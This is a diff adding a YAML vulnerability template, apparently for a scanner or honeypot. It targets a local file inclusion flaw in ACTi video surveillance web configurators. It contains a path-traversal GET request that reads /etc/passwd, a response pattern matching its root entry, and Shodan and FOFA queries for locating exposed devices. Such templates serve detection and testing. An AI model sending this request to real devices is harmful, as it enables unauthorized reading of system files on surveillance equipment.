@@ -1,0 +1,26 @@
+id: acti-video-lfi
+info:
+  name: ACTi-Video Monitoring - Local File Inclusion
+  author: DhiyaneshDk
+  description: 'ACTI video surveillance has loopholes in reading any files
+
+    '
+  severity: high
+  reference:
+  - https://www.cnblogs.com/hmesed/p/16292252.html
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"Web Configurator"
+    fofa-query: app="ACTi-视频监控"
+  tags: acti,lfi,iot,video,monitoring
+traps:
+- request:
+    method: GET
+    path: /images/../../../../../../../../etc/passwd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: 'root:.*:0:0:'
